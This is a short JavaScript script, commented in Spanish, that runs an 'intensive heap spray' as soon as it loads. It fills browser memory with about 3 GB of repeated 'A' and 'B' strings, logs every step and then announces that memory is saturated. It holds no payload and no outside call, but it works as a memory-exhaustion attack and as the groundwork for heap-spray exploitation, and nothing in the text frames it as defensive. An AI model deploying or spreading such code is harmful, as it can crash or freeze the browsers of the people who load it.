(function() {
    const sprayArray = [];
    const largeObjectSize = 0xA00000;  // 10 MB por objeto grande
    const smallObjectSize = 0x500000;  // 5 MB por objeto pequeño
    const totalIterations = 200;       // Aumentar número de objetos para una carga más intensa

    console.log("[+] Iniciando heap spraying intensivo...");

    for (let i = 0; i < totalIterations; i++) {
        // Crear objetos grandes y pequeños sin pausas para llenar la memoria rápidamente
        let largeObject = "A".repeat(largeObjectSize);
        let smallObject = "B".repeat(smallObjectSize);
        
        sprayArray.push(largeObject, smallObject);

        // Registro en cada iteración para seguimiento en el navegador
        console.log(`[+] Iteración ${i + 1}: Objetos grandes y pequeños añadidos al heap.`);
    }

    console.log("[+] Heap spraying intensivo completado. La memoria está saturada de objetos.");
    alert("Heap spraying intensivo completado. Verifica el estado del sistema.");
})();
